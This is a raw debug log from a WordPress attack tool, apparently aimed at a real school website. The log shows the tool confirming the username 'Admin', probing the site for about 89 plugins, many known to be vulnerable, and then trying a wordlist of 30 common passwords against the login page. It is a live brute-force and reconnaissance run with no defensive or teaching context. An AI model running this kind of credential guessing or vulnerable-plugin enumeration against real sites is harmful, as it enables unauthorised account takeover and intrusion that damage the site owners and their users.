2018-05-28 10:24:59,047 - INFO - Target URL: http://www.smk-ipiems.sch.id/
2018-05-28 10:24:59,049 - INFO - Checking URL & username...
2018-05-28 10:24:59,052 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-login.php [('log', 'Admin'), ('pwd', '3025093')]
2018-05-28 10:25:01,521 - INFO - Usernames: Admin
2018-05-28 10:25:01,529 - DEBUG - Requesting http://www.smk-ipiems.sch.id/ []
2018-05-28 10:25:06,005 - INFO - 89 plugins will be tested
2018-05-28 10:25:06,018 - DEBUG - Checking for Login LockDown plugin
2018-05-28 10:25:06,020 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-login.php []
2018-05-28 10:25:08,149 - DEBUG - Loading wordlist...
2018-05-28 10:25:08,150 - DEBUG - 30 words loaded from wordlist.txt
2018-05-28 10:25:08,151 - INFO - 30 passwords will be tested
2018-05-28 10:25:08,160 - INFO - Starting workers...
2018-05-28 10:25:08,164 - DEBUG - Cached http://www.smk-ipiems.sch.id/ []
2018-05-28 10:25:08,173 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-settings.php []
2018-05-28 10:25:08,193 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/wp-property []
2018-05-28 10:25:08,195 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/portable-phpmyadmin []
2018-05-28 10:25:08,203 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/all-video-gallery []
2018-05-28 10:25:08,211 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/advanced-custom-fields []
2018-05-28 10:25:08,938 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/akismet/akismet.php []
2018-05-28 10:25:14,637 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/devformatter []
2018-05-28 10:25:14,678 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/solvemedia []
2018-05-28 10:25:14,690 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/comment-rating []
2018-05-28 10:25:14,730 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/beer-recipes []
2018-05-28 10:25:21,054 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/wptouch []
2018-05-28 10:25:21,248 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/editormonkey []
2018-05-28 10:25:21,262 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/sermon-browser []
2018-05-28 10:25:21,287 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/ajax-category-dropdown []
2018-05-28 10:25:21,411 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/hello.php []
2018-05-28 10:25:22,330 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/wp-custom-pages []
2018-05-28 10:25:27,109 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/backwpup []
2018-05-28 10:25:27,551 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/flash-album-gallery []
2018-05-28 10:25:27,598 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/php_speedy_wp []
2018-05-28 10:25:27,721 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/old-post-spinner []
2018-05-28 10:25:28,398 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/jquery-mega-menu []
2018-05-28 10:25:33,146 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/iwant-one-ihave-one []
2018-05-28 10:25:33,745 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/forum-server []
2018-05-28 10:25:33,810 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/relevanssi []
2018-05-28 10:25:33,933 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/gigpress []
2018-05-28 10:25:34,409 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/comment-rating []
2018-05-28 10:25:39,209 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/z-vote []
2018-05-28 10:25:39,980 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/user-meta []
2018-05-28 10:25:40,081 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/user-photo []
2018-05-28 10:25:40,227 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/enable-media-replace []
2018-05-28 10:25:40,591 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/mingle-forum []
2018-05-28 10:25:45,260 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/accept-signups []
2018-05-28 10:25:46,115 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/event-registration []
2018-05-28 10:25:46,291 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/events-manager-extended []
2018-05-28 10:25:46,410 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/nextgen-smooth-gallery []
2018-05-28 10:25:46,662 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/nextgen-smooth-gallery []
2018-05-28 10:25:51,400 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/mylinksdump []
2018-05-28 10:25:52,332 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/akismet []
2018-05-28 10:25:52,585 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/firestats []
2018-05-28 10:25:52,799 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/wp-login []
2018-05-28 10:25:52,995 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/simple-press []
2018-05-28 10:25:57,435 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/cimy-counter []
2018-05-28 10:25:58,804 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/zingiri-web-shop []
2018-05-28 10:25:58,996 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/website-faq []
2018-05-28 10:25:59,189 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/videowhiper-video-conference-integration []
2018-05-28 10:26:03,530 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/contus-video-galleryversion-10 []
2018-05-28 10:26:04,071 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/topquark []
2018-05-28 10:26:05,022 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/tinymce-thumbnail-gallery []
2018-05-28 10:26:05,298 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/thinkun-remind []
2018-05-28 10:26:05,477 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/wpstorecart []
2018-05-28 10:26:09,652 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/simple-download-button-shortcode []
2018-05-28 10:26:10,268 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/schreikasten []
2018-05-28 10:26:11,405 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/rboxgallery []
2018-05-28 10:26:11,650 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/wp-property []
2018-05-28 10:26:11,872 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/picturesurf-gallery []
2018-05-28 10:26:15,833 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/pica-photo-gallery []
2018-05-28 10:26:16,365 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/pdw-file-browser []
2018-05-28 10:26:17,725 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/omni-secure-files []
2018-05-28 10:26:18,023 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/wordpress-member-private-conversation []
2018-05-28 10:26:18,376 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/nmedia-user-file-uploader []
2018-05-28 10:26:22,299 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/plugin-newsletter []
2018-05-28 10:26:22,721 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/mm-forms-community []
2018-05-28 10:26:24,079 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/wp-mass-mail []
2018-05-28 10:26:24,430 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/lim4wp []
2018-05-28 10:26:24,787 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/lib-mixed-slideshow []
2018-05-28 10:26:28,430 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/katalyst-timthumb []
2018-05-28 10:26:28,710 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/inivit0r []
2018-05-28 10:26:30,017 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/wp-imagezoom []
2018-05-28 10:26:30,468 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/imagedrop []
2018-05-28 10:26:30,928 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/hungred-post-thumbnail []
2018-05-28 10:26:34,374 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/HT-Poi []
2018-05-28 10:26:34,774 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/html5avmanager []
2018-05-28 10:26:36,043 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/contus-hd-flv-player []
2018-05-28 10:26:36,519 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/wp-gpx-maps []
2018-05-28 10:26:37,074 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/store-locator-le []
2018-05-28 10:26:40,366 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/gallery-plugin []
2018-05-28 10:26:40,931 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/front-file-manager []
2018-05-28 10:26:42,215 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/front-end-upload []
2018-05-28 10:26:42,753 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/foxypress []
2018-05-28 10:26:43,280 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/font-uploader []
2018-05-28 10:26:46,523 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/fcchat []
2018-05-28 10:26:47,157 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/evarisk []
2018-05-28 10:26:48,352 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/email-newsletter []
2018-05-28 10:26:48,964 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/wp-easy-gallery []
2018-05-28 10:26:49,484 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/easy-contact-forms-exporter []
2018-05-28 10:26:52,717 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/darg-drop-file-uploader []
2018-05-28 10:26:53,339 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/comment-extra-field []
2018-05-28 10:26:54,509 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/custom-content-type-manager []
2018-05-28 10:26:55,209 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/auctionPlugin []
2018-05-28 10:26:55,516 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/asset-manager []
2018-05-28 10:26:58,657 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/annouces []
2018-05-28 10:26:59,536 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-content/plugins/front-file-manager []
2018-05-28 10:27:00,567 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-login.php [('log', 'Admin'), ('pwd', 'Admin')]
2018-05-28 10:27:01,347 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-login.php [('log', 'Admin'), ('pwd', 'prueba')]
2018-05-28 10:27:01,589 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-login.php [('log', 'Admin'), ('pwd', 'test')]
2018-05-28 10:27:04,692 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-login.php [('log', 'Admin'), ('pwd', 'admin')]
2018-05-28 10:27:05,759 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-login.php [('log', 'Admin'), ('pwd', 'wordpress')]
2018-05-28 10:27:06,159 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-login.php [('log', 'Admin'), ('pwd', 'blog')]
2018-05-28 10:27:07,122 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-login.php [('log', 'Admin'), ('pwd', 'demo')]
2018-05-28 10:27:07,273 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-login.php [('log', 'Admin'), ('pwd', 'administrador')]
2018-05-28 10:27:10,151 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-login.php [('log', 'Admin'), ('pwd', 'administrator')]
2018-05-28 10:27:11,017 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-login.php [('log', 'Admin'), ('pwd', 'admin1234')]
2018-05-28 10:27:11,512 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-login.php [('log', 'Admin'), ('pwd', 'asdf')]
2018-05-28 10:27:12,808 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-login.php [('log', 'Admin'), ('pwd', 'asdf1234')]
2018-05-28 10:27:12,916 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-login.php [('log', 'Admin'), ('pwd', 'abc123')]
2018-05-28 10:27:15,486 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-login.php [('log', 'Admin'), ('pwd', 'asdfgh')]
2018-05-28 10:27:16,328 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-login.php [('log', 'Admin'), ('pwd', 'qwert')]
2018-05-28 10:27:16,869 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-login.php [('log', 'Admin'), ('pwd', 'qwerty')]
2018-05-28 10:27:18,467 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-login.php [('log', 'Admin'), ('pwd', '1111')]
2018-05-28 10:27:18,686 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-login.php [('log', 'Admin'), ('pwd', '111111')]
2018-05-28 10:27:20,812 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-login.php [('log', 'Admin'), ('pwd', '123123')]
2018-05-28 10:27:21,848 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-login.php [('log', 'Admin'), ('pwd', '654321')]
2018-05-28 10:27:22,414 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-login.php [('log', 'Admin'), ('pwd', '1234')]
2018-05-28 10:27:24,061 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-login.php [('log', 'Admin'), ('pwd', '123456')]
2018-05-28 10:27:24,400 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-login.php [('log', 'Admin'), ('pwd', '1234567')]
2018-05-28 10:27:26,377 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-login.php [('log', 'Admin'), ('pwd', '12345678')]
2018-05-28 10:27:27,376 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-login.php [('log', 'Admin'), ('pwd', '123456789')]
2018-05-28 10:27:27,988 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-login.php [('log', 'Admin'), ('pwd', '1234567890')]
2018-05-28 10:27:29,782 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-login.php [('log', 'Admin'), ('pwd', 'qawsed')]
2018-05-28 10:27:30,094 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-login.php [('log', 'Admin'), ('pwd', 'qazwsx')]
2018-05-28 10:27:31,934 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-login.php [('log', 'Admin'), ('pwd', 'password')]
2018-05-28 10:27:33,011 - DEBUG - Requesting http://www.smk-ipiems.sch.id/wp-login.php [('log', 'Admin'), ('pwd', 'passw0rd')]
